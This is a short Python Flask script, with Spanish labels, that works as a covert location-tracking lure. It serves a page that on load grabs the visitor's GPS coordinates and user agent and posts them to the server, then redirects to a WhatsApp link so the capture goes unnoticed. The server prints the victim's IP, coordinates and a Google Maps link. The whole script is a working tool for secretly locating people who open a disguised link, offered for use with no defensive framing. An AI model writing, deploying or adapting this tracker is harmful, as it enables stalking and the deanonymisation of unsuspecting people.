#!/usr/bin/env python3
import os
import requests
import threading
import subprocess
import time
from flask import Flask, request, render_template_string

app = Flask(__name__)

# --- CONFIGURACIÓN ---
URL_FINAL = "https://wa.me/595981000000"

HTML_RASTREO = """
<!DOCTYPE html>
<html>
<body onload="capturar()">
    <script>
        function capturar() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    fetch('/log', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            ua: navigator.userAgent
                        })
                    }).then(() => window.location.href = "%s");
                }, () => window.location.href = "%s");
            } else { window.location.href = "%s"; }
        }
    </script>
</body>
</html>
""" % (URL_FINAL, URL_FINAL, URL_FINAL)

@app.route('/')
def index():
    return render_template_string(HTML_RASTREO)

@app.route('/log', methods=['POST'])
def log():
    d = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    lat, lon = d.get('lat'), d.get('lon')
    print(f"\n\033[1;32m[!] DATOS RECIBIDOS:\033[0m")
    print(f"IP: {ip}")
    print(f"COORDENADAS: {lat}, {lon}")
    print(f"BARRIO/MAPA: https://www.google.com/maps/search/?api=1&query={lat},{lon}")
    print(f"ACCESO GPS: OTORGADO")
    return "OK"

